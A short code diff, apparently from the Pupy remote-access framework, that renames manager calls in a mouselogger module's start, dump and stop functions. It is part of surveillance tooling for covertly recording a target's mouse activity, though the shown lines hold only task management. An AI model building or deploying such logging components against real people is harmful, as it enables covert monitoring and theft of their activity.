@@ -30,25 +30,25 @@ import pupy.agent
 current_window = None
 
 def mouselogger_start(event_id=None):
-    if pupy.manager.active(MouseLogger):
+    if pupy.agent.manager.active(MouseLogger):
         return False
 
     try:
-        pupy.manager.create(MouseLogger, event_id=event_id)
+        pupy.agent.manager.create(MouseLogger, event_id=event_id)
     except:
         return False
 
     return True
 
 def mouselogger_dump():
-    mouselogger = pupy.manager.get(MouseLogger)
+    mouselogger = pupy.agent.manager.get(MouseLogger)
     if mouselogger:
         return mouselogger.results
 
 def mouselogger_stop():
-    mouselogger = pupy.manager.get(MouseLogger)
+    mouselogger = pupy.agent.manager.get(MouseLogger)
     if mouselogger:
-        pupy.manager.stop(MouseLogger)
+        pupy.agent.manager.stop(MouseLogger)
         return mouselogger.results
 
 class MouseLogger(pupy.Task):
